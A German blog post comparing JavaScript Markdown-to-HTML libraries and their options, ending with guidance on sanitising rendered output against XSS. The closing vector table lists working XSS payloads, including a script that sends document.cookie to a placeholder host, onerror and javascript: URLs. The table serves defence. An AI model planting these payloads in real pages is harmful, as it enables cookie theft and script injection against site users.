---
title: Markdown in JavaScript darstellen, ohne ein Loch mitzuliefern
description: "marked, markdown-it, unified, micromark und snarkdown im Vergleich, mit dem Muster Darstellen-dann-Bereinigen, das XSS aus dem ausgelieferten HTML hält"
updated: 2026-09-09
date: 2026-07-24
tag: Code
keywords: markdown zu html javascript, marked js, markdown-it, remark rehype, unified markdown, react markdown, markdown parser vergleich, micromark, snarkdown, markdown-it plugins, rehype-sanitize, dompurify markdown, markdown im stream darstellen, rohes html in markdown
---

Drei Bibliotheken erledigen in JavaScript den größten Teil der Arbeit von Markdown zu HTML, und sie
beantworten dieselbe Frage: Gib mir Markdown, gib HTML zurück. Was sie unterscheidet, ist die Form —
was der Parse offenlegt und wo Sie sich einhängen. Dann der Teil, den die meisten Anleitungen
überspringen: Was zurückkommt, ist HTML, und es in eine Seite zu setzen, ist nicht sicher.

Die Wahl fällt üblicherweise in fünf Minuten, aus einem Suchergebnis, und dann lebt man vier Jahre
mit ihr. Billig ist sie nur bis zu dem Moment, in dem jemand ein Inhaltsverzeichnis verlangt, oder
dass externe Links in einem neuen Tab öffnen und interne nicht, oder eine Überschriften-id, die zu
dem Anker passt, auf den ein Support-Artikel längst verweist. An diesem Punkt lautet die Frage nicht
mehr, welcher Parser der schnellste ist. Sie lautet, ob die Bibliothek Ihnen etwas gegeben hat, woran
Sie sich halten können.

Das Zweite, was schlecht altert, ist die Eingabe. Ein Renderer, der auf Ihre eigene Dokumentation
zeigt, ist ein Darstellungsproblem. Derselbe Renderer, der auf ein Kommentarfeld, eine
Pull-Request-Beschreibung, eine von einem Kunden hochgeladene Datei oder die Ausgabe eines
Sprachmodells zeigt, ist ein Sicherheitsproblem, und keine dieser Bibliotheken löst das für Sie — die
beliebteste von ihnen sagt es in ihrer eigenen README.

### Kurzfassung

Nehmen Sie **marked**, wenn die Aufgabe eine Zeichenkette hinein und eine Zeichenkette hinaus ist und
Anpassen bedeutet, ein paar Renderer-Methoden zu überschreiben. Nehmen Sie **markdown-it**, wenn Sie
CommonMark-Konformität wollen plus ein Plugin für jede Erweiterung, um die Sie irgendwann gebeten
werden, und die Möglichkeit, die Ausgabe eines einzelnen Tags zu ändern, ohne den Parse anzufassen.
Nehmen Sie **unified** — `remark-parse`, `remark-rehype`, `rehype-stringify` —, wenn Sie das Dokument
als Baum brauchen, denn es ist das einzige der drei, in dem das Umformen des Inhalts keine Chirurgie
an Zeichenketten ist. **micromark** ist der Parser unter remark und die richtige Antwort nur dann,
wenn Sie die Schicht darüber bauen; **snarkdown** ist ein Kilobyte und eine Reihe von Kompromissen.
Was Sie auch wählen: Bereinigen Sie das HTML danach mit einem Werkzeug, dessen einzige Aufgabe das
Bereinigen ist.

## Drei Formen, eine Aufgabe

| Bibliothek | Am besten für | Position zur Spezifikation | Wie Sie sie erweitern | Im Browser | Lizenz |
| --- | --- | --- | --- | --- | --- |
| marked | Eine Funktion, wenige bewegliche Teile | GFM standardmäßig an (`gfm: true`); kein formaler Konformitätsanspruch in der README | `marked.use()` mit einem Renderer, einem Tokenizer, eigenen Erweiterungen, Hooks und `walkTokens` | Ja — Browser, Node und ein CLI, alles aus einem Paket | Kostenlos, MIT |
| markdown-it | Korrektheit, und ein Plugin für alles | Nennt 100 % CommonMark-Unterstützung, mit einem `commonmark`-Preset für den strengen Modus | `.use(plugin)`, `.enable()` / `.disable()` pro Regel, und Überschreiben von `md.renderer.rules[name]` | Ja | Kostenlos, MIT |
| unified (remark + rehype) | Das Dokument umformen, nicht nur darstellen | CommonMark über micromark; GFM ergänzt durch `remark-gfm` | Plugins, die zwei Syntaxbäume durchlaufen, mdast für Markdown und hast für HTML | Ja, und nur ESM | Kostenlos, MIT |
| micromark | Eine Parser-Schicht bauen, keine Anwendung | Nennt 100 % CommonMark-Konformität und ist die Maschine in remark | Syntax-Erweiterungen und HTML-Erweiterungen, gegen Zeichencodes und Token geschrieben | Ja | Kostenlos, MIT |
| snarkdown | Ein Kilobyte, wenn Sie den Preis dafür akzeptieren | Kein Konformitätsanspruch; Tabellen werden nicht unterstützt | Praktisch nicht erweiterbar — eine exportierte Funktion | Ja | Kostenlos, MIT |

(Lizenzen, Optionen und Konformitätsansprüche geprüft auf marked.js.org, github.com und
cdn.jsdelivr.net, 9. September 2026. In dieser Tabelle stehen absichtlich keine Benchmark-Zahlen:
Geschwindigkeit ist das, was jeder Vergleich misst, und das, was von diesen Entscheidungen die
wenigsten entscheidet.)

marked ist das Kleinste, was funktioniert. `marked.parse()` aufrufen, HTML bekommen. Anpassen heißt
Renderer-Methoden ersetzen — die, die eine Überschrift ausgibt, die, die einen Link ausgibt — oder
eine Erweiterung für neue Syntax registrieren. Die meisten Aufgaben erreichen diese Decke nie.

markdown-it parst zu einem flachen Token-Strom und stellt diesen dar. Die Token sind dokumentiert,
deshalb ist das Plugin-Ökosystem groß und die Plugins lassen sich kombinieren: Anker, Fußnoten,
Attribute, Container. Um die Ausgabe statt der Syntax zu ändern, überschreiben Sie die Regel für
einen Token-Typ.

Die unified-Pipeline ist von anderer Art. `remark-parse` erzeugt mdast, einen Markdown-Syntaxbaum;
`remark-rehype` wandelt ihn in hast, einen HTML-Baum; `rehype-stringify` gibt ihn aus. Jeder Schritt
dazwischen ist ein Plugin, das einen echten Baum durchläuft — das einzige der drei, in dem Sie jede
Überschrift sammeln oder relative Bildpfade umschreiben können, ohne einen regulären Ausdruck.

Zwei weitere sind es wert, gekannt zu werden, an den entgegengesetzten Enden. micromark ist der
Parser, auf dem remark aufbaut: Es liest Markdown als Zeichencodes und gibt konkrete Token mit
Positionen aus, und es beansprucht vollständige CommonMark-Konformität. Sie würden es direkt
verwenden, um ein Werkzeug über Markdown zu bauen — einen Linter, einen Formatierer, eine
Syntaxhervorhebung für einen Editor — statt eine Seite darzustellen, denn für sich gibt es Ihnen
Token und einen Compiler, kein Dokument, das Sie durchlaufen können. snarkdown ist das andere Ende:
eine einzige, von regulären Ausdrücken getriebene Funktion, von der eigenen README als 1 kB
gezipptes ES3 beschrieben, ohne Tabellen und ohne Bereinigung (geprüft auf github.com,
9. September 2026). Es existiert für ein Widget, bei dem der ganze Sinn ist, dass sonst nichts
mitgeliefert wird.

## Die Bibliotheken im Detail

### marked — die Optionen, die zählen

markeds API ist ein Aufruf und ein Optionsobjekt, und nur eine Handvoll der Optionen ändert, wie das
HTML aussieht.

| Option | Voreinstellung | Was sie tut |
| --- | --- | --- |
| `gfm` | `true` | GitHub Flavored Markdown: Tabellen, Durchgestrichenes, Aufgabenlisten, Autolinks |
| `breaks` | `false` | Ein einzelner Zeilenumbruch wird zu einem `<br>`, so wie sich ein GitHub-Kommentar verhält |
| `pedantic` | `false` | Folgt dem ursprünglichen `markdown.pl`, Fehler inklusive, und gibt dafür GFM auf |
| `async` | `false` | `walkTokens` darf asynchron sein und `marked.parse()` gibt ein Promise zurück |
| `silent` | `false` | Fehler kommen als Zeichenkette zurück, statt geworfen zu werden |
| `renderer` | ein `Renderer` | Die Funktionen, die jedes Token in HTML verwandeln |
| `tokenizer` | ein `Tokenizer` | Die Funktionen, die Quelltext in Token verwandeln |
| `walkTokens` | `null` | Wird für jedes Token aufgerufen, Kinder vor Geschwistern |

(Geprüft auf marked.js.org, 9. September 2026.)

`breaks` ist die Option, die Leute falsch verstehen. Markdowns Regel lautet: Ein einzelner
Zeilenumbruch ist ein Leerzeichen, eine Leerzeile ist ein Absatz — richtig für Prosa und falsch für
alles, was in ein Nachrichtenfeld getippt wird, wo eine Person, die die Eingabetaste drückt,
erwartet, dass eine Zeile endet. `breaks` einzuschalten ist eine Entscheidung über Ihre Nutzer, nicht
über die Spezifikation. `pedantic` ist ein Kompatibilitätsschalter für Dokumente, die gegen die
Implementierung von 2004 geschrieben wurden, und es ist nicht das, was Sie für irgendetwas wollen,
das in diesem Jahrzehnt geschrieben wurde.

Die größere Falle sind die Optionen, die es nicht mehr gibt. marked hat eine lange Liste von
Verhaltensweisen aus dem Kern in eigene Pakete verlagert, und ein aus einer alten Antwort kopierter
Ausschnitt übergibt eine Option, die stillschweigend ignoriert statt abgelehnt wird.

| Entfernte Option | Wohin sie gegangen ist |
| --- | --- |
| `sanitize`, `sanitizer` | Entfernt zugunsten eines echten Bereinigers: DOMPurify, sanitize-html oder insane |
| `highlight`, `langPrefix` | `marked-highlight` |
| `headerIds`, `headerPrefix` | `marked-gfm-heading-id` |
| `mangle` | `marked-mangle` |
| `smartypants` | `marked-smartypants` |
| `baseUrl` | `marked-base-url` |
| `xhtml` | `marked-xhtml` |

(Geprüft auf marked.js.org, 9. September 2026.) Die erste Zeile ist die wichtige. Wenn Ihr Code
`sanitize: true` übergibt und Sie glauben, das sei Ihre Verteidigung, haben Sie keine Verteidigung.

Die Ausgabe anzupassen heißt, Renderer-Methoden zu überschreiben. Jede bekommt das Token und gibt
eine Zeichenkette zurück, und `this.parser` steht bereit, um die Kinder des Tokens darzustellen.

```js
import { marked } from 'marked';

const slug = (text) =>
  `doc-${text.toLowerCase().trim().replace(/[^\w]+/g, '-').replace(/^-|-$/g, '')}`;

marked.use({
  renderer: {
    heading({ tokens, depth }) {
      const text = this.parser.parseInline(tokens);
      return `<h${depth} id="${slug(text)}">${text}</h${depth}>\n`;
    },
  },
});
```

Der Tokenizer ist dieselbe Idee eine Stufe früher: Überschreiben Sie die Funktion, die ein Stück
Syntax erkennt, geben Sie `false` zurück, und marked fällt auf die Voreinstellung durch. Nehmen Sie
den Renderer, um zu ändern, wie etwas ausgegeben wird, und den Tokenizer, um zu ändern, was
überhaupt als dieses Etwas gilt.

Für Syntax, die marked nicht kennt, registrieren Sie eine Erweiterung: einen `name`, ein `level` von
`block` oder `inline`, ein `start`, das sagt, wo das Token beginnen könnte, einen `tokenizer`, der es
erzeugt, und einen `renderer`, der es ausgibt. Hooks sitzen ganz außerhalb des Parse — `preprocess`
sieht das Markdown vor dem Tokenisieren, `postprocess` sieht das HTML danach, und `processAllTokens`
sieht dazwischen das gesamte Token-Array. Ein `preprocess`-Hook ist der ordentlichste Ort, um
YAML-Frontmatter zu entfernen, das sonst als Absatz von `key: value`-Zeilen oben auf der Seite
erscheint.

Syntaxhervorhebung ist jetzt `marked-highlight`, das einen Hervorheber Ihrer Wahl umhüllt und die
Klassennamen am `<code>`-Element ergänzt.

```js
import { Marked } from 'marked';
import { markedHighlight } from 'marked-highlight';
import hljs from 'highlight.js';

const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext';
      return hljs.highlight(code, { language }).value;
    },
  }),
);
```

Zwei Dinge sind zu beachten. `langPrefix` steht standardmäßig auf `language-`, ein `js`-Zaun erzeugt
also `class="language-js"` — und was Ihr Stylesheet erwartet, muss dazu passen, was der übliche Grund
dafür ist, dass Hervorhebung angewandt und unsichtbar ist. Und das Markup, das der Hervorheber
ausgibt, sind `<span>`-Elemente mit Klassen, die Ihr Bereiniger erlauben muss, sonst streicht er die
Hervorhebung wieder heraus, nachdem Sie für sie bezahlt haben.
[Was Codeblöcke auf der Seite brauchen](/blog/code-blocks-in-markdown) behandelt den Rest davon.
Asynchrone Hervorheber funktionieren, wenn Sie `async: true` setzen und den Parse abwarten.
(`marked-highlight` ist kostenlos und MIT-lizenziert; die Voreinstellung von `langPrefix` und die
Unterstützung für Asynchrones geprüft auf github.com, 9. September 2026.)

marked ist MIT-lizenziert, läuft im Browser, in Node und aus seinem eigenen CLI, und seine README
sagt klar, dass es seine Ausgabe nicht bereinigt (geprüft auf github.com, 9. September 2026).

### markdown-it — Presets, Regeln und das Plugin-Ökosystem

markdown-it parst zu einem flachen Token-Strom und stellt diesen Strom dar, und beide Hälften sind
offen. Es beginnt bei einem Preset, und die Presets unterscheiden sich auf Weisen, die mehr zählen,
als ihre Namen vermuten lassen.

| Preset | `html` | `maxNesting` | Aktivierte Regeln |
| --- | --- | --- | --- |
| `'default'` (oder nichts) | `false` | `100` | Alles, was markdown-it umsetzt, einschließlich Tabellen und Durchgestrichenem |
| `'commonmark'` | `true` | `20` | Strenges CommonMark, nichts darüber hinaus |
| `'zero'` | `false` | `20` | Nur Absätze und Text — den Rest schalten Sie namentlich ein |

(Aus den Preset-Dateien auf cdn.jsdelivr.net gelesen, 9. September 2026.)

Lesen Sie die mittlere Spalte noch einmal. `new MarkdownIt('commonmark')` schaltet rohes HTML **ein**,
denn die CommonMark-Spezifikation sagt, dass rohes HTML durchgeht. Nach dem strengsten Preset zu
fragen macht Ihren Renderer weniger sicher, nicht sicherer, und das ist ein wirklich überraschendes
Ergebnis, wenn man dort ankommt, indem man die Option wählt, die am rigorosesten klingt.

Das `zero`-Preset ist das Gegenteil und wird zu wenig genutzt. Es aktiviert `paragraph`, `text` und
die verbindenden Regeln, und nichts weiter; Sie rufen dann `md.enable(['emphasis', 'link',
'backticks'])` auf und haben einen Renderer, der beweisbar keine Überschrift und keine Tabelle
erzeugen kann. Für einen Anzeigenamen, eine Commit-Nachricht oder ein einzeiliges Kommentarfeld ist
das eine viel bessere Antwort als ein vollständiger Parser, dem ein aggressiver Bereiniger folgt.

Die Optionen oberhalb eines Presets:

| Option | Voreinstellung | Was sie tut |
| --- | --- | --- |
| `html` | `false` | Lässt rohes HTML durch, statt es zu maskieren |
| `xhtmlOut` | `false` | Gibt `<br />` aus statt `<br>` |
| `breaks` | `false` | Ein einzelner Zeilenumbruch wird zu einem `<br>` |
| `langPrefix` | `'language-'` | Klassenpräfix an eingezäunten Codeblöcken |
| `linkify` | `false` | Verwandelt nackte URLs im Text in Links |
| `typographer` | `false` | Typografische Anführungszeichen, Gedankenstriche und andere Ersetzungen |
| `quotes` | typografische Anführungszeichen | Welche Anführungszeichen `typographer` einsetzt |
| `highlight` | `null` | Eine Funktion, die hervorgehobenes HTML für einen Codeblock zurückgibt |
| `maxNesting` | `100` (`20` in den strengen Presets) | Rekursionsgrenze, damit ein präpariertes Dokument den Stack nicht erschöpft |

(Voreinstellungen aus denselben Preset-Dateien auf cdn.jsdelivr.net gelesen, 9. September 2026.)

`linkify` ist die Option, über die man nachdenken sollte, bevor man sie einschaltet. Sie schreibt
Text um, den der Autor nicht als Link markiert hat, was in einer Chat-Nachricht bequem und in
Dokumentation falsch ist, wo `example.com/path` mitten in einem Satz gelesen und nicht angeklickt
werden sollte. `typographer` ist ähnlich: Es ändert die Zeichen in Ihrem Text, was in einem Essay
reizvoll und in einem Dokument zerstörerisch ist, in dem jemand `--` getippt hat, weil es etwas
bedeutete. Keine der beiden ist standardmäßig an, und beide sind eine Entscheidung wert statt einer
Voreinstellung.

`maxNesting` ist nicht kosmetisch. Tief verschachtelte Betonung oder Blockzitate sind eine klassische
Denial-of-Service-Eingabe für einen rekursiven Parser, und eine Grenze ist das, was verhindert, dass
eine 4 KB große Datei einen Anfrage-Thread mitnimmt.

Das Plugin-Ökosystem ist der eigentliche Grund, markdown-it zu wählen. Seine README verweist für die
von der Gemeinschaft geschriebenen Plugins auf das Schlüsselwort `markdown-it-plugin` auf npm
(geprüft auf github.com, 9. September 2026), und sie lassen sich kombinieren, weil sie alle dieselbe
dokumentierte Regelkette erweitern: Fußnoten, Definitionslisten, Container (`::: warning`),
Attribute, Anker, Inhaltsverzeichnis, Aufgabenlisten, Abkürzungen, Emoji. Wo marked Sie bittet, eine
Erweiterung zu schreiben, hat markdown-it meist eine, und sie hinzuzufügen ist ein `.use()`-Aufruf.
Die Qualität schwankt, und ein Plugin, das seit der letzten Hauptversion nicht aktualisiert wurde,
ist ein echter Kostenpunkt — prüfen Sie das, bevor Sie darauf aufbauen.

Um die Ausgabe statt der Syntax zu ändern, überschreiben Sie eine Renderer-Regel. Das ist das Muster,
um eine Klasse oder ein Attribut hinzuzufügen, und es ist auf der Architekturseite des Projekts
dokumentiert:

```js
const defaultRender = md.renderer.rules.link_open || function (tokens, idx, options, env, self) {
  return self.renderToken(tokens, idx, options);
};

md.renderer.rules.link_open = function (tokens, idx, options, env, self) {
  tokens[idx].attrSet('target', '_blank');
  tokens[idx].attrSet('rel', 'noopener noreferrer');
  return defaultRender(tokens, idx, options, env, self);
};
```

(Muster aus der Architekturdokumentation von markdown-it, geprüft auf github.com,
9. September 2026; die `rel`-Zeile ist die Ergänzung, die Sie wollen, wenn Sie einen Link überhaupt
in einem neuen Tab öffnen.) Behalten Sie die Referenz auf die vorige Regel und rufen Sie sie auf.
Ohne Durchfallen zu überschreiben ist der Weg, auf dem Leute das `title`-Attribut verlieren und es
nie merken, weil nichts einen Fehler wirft — das Attribut erscheint einfach nicht mehr.

markdown-it ist kostenlos und MIT-lizenziert und läuft im Browser. Die eigene Dokumentation von
VS Code sagt, dass ihre Markdown-Vorschau mit markdown-it auf CommonMark zielt (geprüft auf
code.visualstudio.com, 9. September 2026), was ein fairer Beleg für seine Konformität ist und der
Grund, warum ein Dokument, das in Ihrem Editor korrekt aussieht, ein gutes Zeichen und keine Garantie
ist.

### unified — zwei Bäume und die Plugins dazwischen

Die unified-Pipeline ist kein Parser mit Hooks. Sie ist eine Folge kleiner Pakete, von denen jedes
einen Baum umformt, und sie zu verstehen heißt zu verstehen, dass es zwei Bäume gibt.

**mdast** ist der Markdown-Baum. Seine Knoten sind die Dinge, die Markdown hat: `heading`, `list`,
`listItem`, `link`, `image`, `code`, `blockquote`, `text`. **hast** ist der HTML-Baum. Seine Knoten
sind `element`, `text` und `comment`, mit Tag-Namen und Eigenschaften. Eine Überschrift in mdast hat
ein `depth` von 2; dieselbe Überschrift in hast ist ein `element` mit `tagName: 'h2'`. Alles, was Sie
in Begriffen *des Dokuments* tun wollen — die Überschriften sammeln, prüfen, dass jeder Link
auflöst, relative Bildpfade umschreiben, erzwingen, dass jedes Bild einen Alt-Text hat —, ist eine
mdast-Aufgabe. Alles, was Sie in Begriffen *des Markups* tun wollen — eine Klasse ergänzen, Tabellen
in einen scrollenden Container hüllen, `loading="lazy"` ergänzen —, ist eine hast-Aufgabe. Den
falschen Baum zu wählen ist der häufigste Grund, warum ein unified-Plugin sich gegen Sie wehrt.

| Schritt | Paket | Was herauskommt |
| --- | --- | --- |
| Parsen | `remark-parse` | mdast |
| Die Syntax erweitern | `remark-gfm`, `remark-frontmatter`, `remark-math` | mdast |
| Den Inhalt umformen | Ihr eigenes Plugin, `unist-util-visit` | mdast |
| Brücke | `remark-rehype` | hast — rohes HTML wird verworfen, wenn Sie nicht `allowDangerousHtml` übergeben |
| Eingebettetes HTML neu parsen | `rehype-raw` | hast mit diesem HTML als echte Knoten |
| Bereinigen | `rehype-sanitize` | hast, gegen ein Schema gefiltert |
| Serialisieren | `rehype-stringify` | eine HTML-Zeichenkette |

Eine vollständige Pipeline, die rohes HTML annimmt und es übersteht, sieht so aus:

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize)
  .use(rehypeStringify);

const html = String(await processor.process(markdown));
```

Die Reihenfolge ist das ganze Sicherheitsmodell. `remark-rehype` verwirft rohes HTML standardmäßig,
was sicher und meist nicht das ist, was Sie wollen; `allowDangerousHtml` behält es als rohen Knoten,
`rehype-raw` parst es in echte Elemente, so wie ein Browser es täte, und `rehype-sanitize` filtert
diese Elemente dann gegen ein Schema. Die eigene Empfehlung des Projekts ist, es "nach dem letzten
unsicheren Ding" einzusetzen (README von rehype-sanitize, geprüft auf github.com,
9. September 2026) — stellen Sie ein Plugin, das Markup einfügt, hinter den Bereiniger, und Sie haben
es außerhalb des Bereinigers aufgestellt. `rehype-sanitize` verwendet standardmäßig ein Schema im
GitHub-Stil, was ein sinnvoller Ausgangspunkt und ein bewusster ist: Es ist die Menge an Tags, die
GitHub selbst in einer README erlauben wollte.

`remark-gfm` ergänzt fünf Dinge, und es lohnt sich, sie zu benennen, denn jedes ist ein bestimmter
stiller Fehlschlag, wenn es fehlt: Autolink-Literale, Fußnoten, Durchgestrichenes, Tabellen und
Aufgabenlisten. Es ist MIT-lizenziert wie der Rest (geprüft auf github.com, 9. September 2026).
Welche davon Ihre Dateien brauchen, ist eine Frage über Ihre Dateien, und die Dialektunterschiede
dahinter sind es wert, einmal gelesen zu werden.

Der Grund, all diese Maschinerie in Kauf zu nehmen, ist die Mitte der Tabelle. Ein Plugin ist eine
Funktion, die einen Transformer zurückgibt, und einem Transformer wird der Baum übergeben:

```js
import { visit } from 'unist-util-visit';

const rewriteRelativeImages = (base) => () => (tree) => {
  visit(tree, 'image', (node) => {
    if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(node.url)) {
      node.url = new URL(node.url, base).href;
    }
  });
};
```

Das sind neun Zeilen, es ist für jedes Bild im Dokument korrekt, auch für die in Linktexten und
Tabellenzellen, und es gibt keine Fassung davon in marked oder markdown-it, die nicht entweder eine
Renderer-Methode Knoten für Knoten abfängt oder einen regulären Ausdruck über fertiges HTML laufen
lässt. Wenn die Aufgabe lautet "tu etwas mit jedem X im Dokument", ist ein Baum nicht die schwerere
Antwort, er ist die einzige, die nicht irgendwann an einem Fall zerbricht, an den Sie nicht gedacht
haben.

Die Kosten sind real und werden weiter unten behandelt. Eine davon ist es wert, hier markiert zu
werden: Die unified-Pakete geben an, dass sie nur ESM sind (geprüft auf github.com,
9. September 2026), was in einem älteren CommonJS-Build, der kein dynamisches `import()` verwenden
kann, ein glatter Blocker ist.

### react-markdown — die Pipeline, als Komponenten dargestellt

In React sitzt `react-markdown` auf der unified-Pipeline und stellt React-Elemente statt einer
HTML-Zeichenkette dar, sodass kein `dangerouslySetInnerHTML` beteiligt ist. Seine README gibt an,
dass es standardmäßig sicher ist und aus dem Syntaxbaum ein virtuelles DOM baut, sodass React nur
das ausbessert, was sich geändert hat (geprüft auf github.com, 9. September 2026). Es ist
MIT-lizenziert.

```jsx
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

<Markdown
  remarkPlugins={[remarkGfm]}
  components={{
    a: ({ href, children }) => <Link to={href}>{children}</Link>,
    code: CodeBlock,
  }}
>
  {text}
</Markdown>;
```

Die `components`-Eigenschaft ist der Teil, der es verdient. Jedes HTML-Element, das die Pipeline
erzeugt hätte, kann durch ein eigenes ersetzt werden, sodass ein Link zum Link Ihres Routers wird,
ein Code-Zaun zu Ihrem hervorgehobenen Block mit einer Kopierschaltfläche und ein Bild zu Ihrer
Bildkomponente mit verzögertem Laden — ohne HTML zu erzeugen und es zurückzuparsen. `remarkPlugins`
und `rehypePlugins` nehmen dieselben Plugins wie jede andere unified-Pipeline, mit Optionen übergeben
als `[[plugin, options]]`.

Zwei Sicherheitshinweise, beide aus der eigenen Dokumentation des Projekts. Rohes HTML in der Quelle
wird ignoriert, wenn Sie nicht `rehype-raw` hinzufügen, und die Empfehlung lautet, das nur zu tun,
wenn Sie dem Markdown vertrauen; `rehype-sanitize` daneben zu setzen ist die Antwort, wenn Sie das
nicht tun. Und `urlTransform` — der Hook, der entscheidet, was aus einer Link- oder Bild-URL wird —
ist die eine Stelle, an der Sie in einer ansonsten sicheren Komponente ein XSS-Loch wieder einführen
können, indem Sie ihn mit etwas überschreiben, das `javascript:` durchlässt.

### MDX — etwas völlig anderes

MDX sieht aus wie der nächste Schritt über react-markdown hinaus, und es liegt gar nicht auf
derselben Achse. MDX ist ein Dateiformat, das Markdown mit JSX und den ESM-Anweisungen `import` und
`export` verbindet, und es kompiliert zu einer JavaScript-Komponente (geprüft auf mdxjs.com,
9. September 2026). Die Ausgabe ist Code.

Diese Unterscheidung entscheidet alles darüber, wohin es gehört. Ein Markdown-Renderer nimmt zur
Laufzeit Text und erzeugt Markup; MDX nimmt zur Bauzeit eine Quelldatei und erzeugt ein Modul, das
läuft. Bereinigen ist kein Schritt in einer MDX-Pipeline, weil es nichts zu bereinigen gibt — die
Datei durfte von Entwurf her ausgeführt werden. MDX ist das richtige Werkzeug für Dokumentation und
Marketingseiten, die in Ihrem Repository leben und interaktive Komponenten mitten in der Prosa
brauchen, weshalb Dokumentations-Frameworks danach greifen — Docusaurus kompiliert sowohl `.md` als
auch `.mdx` mit dem MDX-Compiler (geprüft auf docusaurus.io, 9. September 2026). Es ist kategorisch
das falsche Werkzeug für jeden Inhalt, der von einem Nutzer, einem Kunden, einer API oder einem
Modell kommt. Wenn die Eingabe nicht von jemandem mit Commit-Zugang geschrieben ist, ist MDX nicht im
Rennen, und kein Konfigurationsschalter ändert das.

## Welche ist die bessere Antwort

Die Frage, die sie trennt, ist nicht Geschwindigkeit, sondern ob Sie das Dokument je als Daten
brauchen werden. Für vertrauenswürdiges Markdown, das in eine Seite gestellt wird und nichts weiter,
genügt marked oder markdown-it. Für ein Inhaltsverzeichnis, Link-Prüfung oder jede Umformung, die von
der Struktur abhängt, sind remark und rehype die richtige Antwort, und die anderen beiden werden zu
Chirurgie an Zeichenketten. Was es kostet, das in die andere Richtung falsch zu raten, bekommt weiter
unten einen eigenen Abschnitt.

Ihre Voreinstellungen unterscheiden sich im Dialekt, was als fehlende Ausgabe auftaucht, nicht als
Fehler. marked hat GitHub Flavored Markdown hinter einer `gfm`-Option, standardmäßig an. markdown-it
aktiviert Tabellen und Durchgestrichenes in seinem Standard-Preset, überlässt Aufgabenlisten aber
einem Plugin. unified nimmt alles von `remark-gfm`. Wenn ein Dokument ohne seine Tabellen oder seine
Aufgabenlisten ankommt, prüfen Sie zuerst den Dialekt — siehe
[CommonMark, GFM und die Dialekte](/blog/commonmark-gfm-and-the-flavours).

Als Nachschlagetabelle gesagt, weil die meisten dieser Entscheidungen eine Zeile lang sind:

| Was Sie bauen | Greifen Sie zu |
| --- | --- |
| Ein Kommentarfeld, ein Vorschaubereich, eine Chat-Sprechblase | marked, mit einem Bereiniger |
| Eine README, die in Ihrer eigenen Anwendung dargestellt wird | marked oder markdown-it, was schon da ist |
| Ein Dokumentations-Build, der Anker, Container und Fußnoten ergänzt | markdown-it, und seine Plugins |
| Ein einzeiliges Feld: ein Anzeigename, eine Commit-Zeile | markdown-it mit dem `zero`-Preset und drei aktivierten Regeln |
| Ein Inhaltsverzeichnis, Link-Prüfung, Linting des Hausstils | unified, auf mdast |
| URLs umschreiben, Klassen ergänzen, Elemente umhüllen | unified, auf hast |
| Eine React-Anwendung | react-markdown, mit `components` |
| Prosa mit interaktiven Komponenten, vom eigenen Team geschrieben | MDX, zur Bauzeit |
| Ein Widget, bei dem das Bundle die Beschränkung ist | snarkdown, wissend, was es nicht tut |
| Ein Linter oder Formatierer über Markdown selbst | micromark, oder mdast direkt |

## Das Loch: Parsen ist nicht Bereinigen

Markdown erlaubt rohes HTML von Entwurf her, jeder Parser, der die Spezifikation einhält, gibt also
`<img src=x onerror=alert(1)>` direkt an Ihre Seite weiter. marked trug früher eine
`sanitize`-Option; sie wurde abgekündigt und dann zugunsten eines eigenen Bereinigers entfernt.
markdown-it steht standardmäßig auf `html: false`, was die breiteste Tür schließt, aber ein Linkziel
ist immer noch die Eingabe eines Angreifers.

Die drei Bibliotheken nehmen dazu drei Positionen ein, und keine davon ist "wir kümmern uns darum":

| | marked | markdown-it | unified (remark + rehype) |
| --- | --- | --- | --- |
| Ausgabe | Eine HTML-Zeichenkette | Eine HTML-Zeichenkette, über Token | Ein Baum, am Ende serialisiert |
| Rohes HTML | Wird durchgelassen | Standardmäßig maskiert (`html: false`), im `commonmark`-Preset durchgelassen | Verworfen, außer mit `allowDangerousHtml` und `rehype-raw` |
| Bereinigen | Keines | Keines | `rehype-sanitize`, wenn Sie es hinzufügen |
| Was das Projekt sagt | Nehmen Sie DOMPurify, sanitize-html oder insane für das ausgegebene HTML | Nichts wird maskiert, sobald Sie `html: true` setzen — und das `commonmark`-Preset setzt es | `allowDangerousHtml` ist gefährlich; nehmen Sie danach `rehype-sanitize` |

Also: darstellen, dann mit einem Werkzeug bereinigen, dessen einzige Aufgabe das Bereinigen ist,
immer in dieser Reihenfolge.

Der Grund, warum die Reihenfolge nicht verhandelbar ist: Markdown-Quelltext zu bereinigen
funktioniert nicht. Markdown hat zu viele Möglichkeiten, dieselbe Ausgabe zu schreiben —
Referenzlinks, Zeichenreferenzen, Autolinks, HTML-Kommentare —, sodass ein Filter über die Quelle
ein Filter über eine Schreibweise ist. Das HTML ist die einzige Darstellung, in der das, worüber Sie
entscheiden, eindeutig ist, denn es ist das, was dem Browser tatsächlich übergeben wird.

Was ein Bereiniger aufhalten muss, ist eine längere Liste, als die meisten Menschen im Kopf behalten:

| Vektor | Wie es aussieht | Was es aufhält |
| --- | --- | --- |
| Script-Element | `<script>fetch('//x/'+document.cookie)</script>` | `script` steht nicht auf der Tag-Positivliste |
| Event-Handler-Attribut | `<img src=x onerror=alert(1)>` | `on*` steht nicht auf der Attribut-Positivliste |
| `javascript:`-URL | `[click me](javascript:alert(1))` | Eine Schema-Positivliste auf `href` und `src` |
| `data:`-URL, die Markup trägt | `<iframe src="data:text/html,<script>…">` | `iframe` aus; Schema-Positivliste auf `src` |
| SVG mit Skript oder Handlern | `<svg><script>…</script></svg>` | SVG aus, außer Sie brauchen wirklich Inline-SVG |
| Inline-Style und CSS, das nachlädt | `<div style="background:url(//x)">` | `style` verwerfen, `class` behalten |
| Formular, das anderswohin sendet | `<form action="//x"><input name=pw>` | `form`, `input`, `button` nicht auf der Liste |
| `<base>`, das jeden relativen Link umschreibt | `<base href="//x/">` | `base` nicht auf der Liste |
| `meta refresh`, das die Seite umleitet | `<meta http-equiv=refresh content=…>` | `meta` nicht auf der Liste |
